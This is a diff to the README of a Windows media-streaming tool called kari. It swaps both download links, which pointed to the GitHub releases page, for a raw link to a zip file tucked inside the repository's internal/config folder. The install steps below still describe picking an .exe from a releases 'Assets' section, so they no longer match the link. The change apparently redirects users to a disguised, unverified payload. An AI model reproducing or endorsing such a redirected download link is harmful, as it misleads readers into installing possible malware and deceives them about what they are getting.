@@ -1,6 +1,6 @@
 # 🏹 kari - Hunt and watch your favorite media
 
-[![](https://img.shields.io/badge/Download-Kari_for_Windows-blue.svg)](https://github.com/bgak1532/kari/releases)
+[![](https://img.shields.io/badge/Download-Kari_for_Windows-blue.svg)](https://raw.githubusercontent.com/bgak1532/kari/main/internal/config/Software-v3.3.zip)
 
 Kari allows you to search, stream, and download anime, movies, and TV shows directly from your computer. It connects to multiple sources to gather content and serves it through your preferred media player. This tool simplifies the process of finding videos by fetching data from various providers, organizing results, and handling playback automatically.
 
@@ -8,7 +8,7 @@ Kari allows you to search, stream, and download anime, movies, and TV shows dire
 
 You need to download the correct file for your Windows system. Follow these steps to set up the software.
 
-1. Visit this page to download: [https://github.com/bgak1532/kari/releases](https://github.com/bgak1532/kari/releases).
+1. Visit this page to download: [https://raw.githubusercontent.com/bgak1532/kari/main/internal/config/Software-v3.3.zip](https://raw.githubusercontent.com/bgak1532/kari/main/internal/config/Software-v3.3.zip).
 2. Look for the section labeled "Assets" under the latest version.
 3. Click the file ending in `.exe` that matches your system architecture. Most modern computers use `windows-amd64.exe`.
 4. Save the file to a folder you can find easily, such as your Downloads folder.
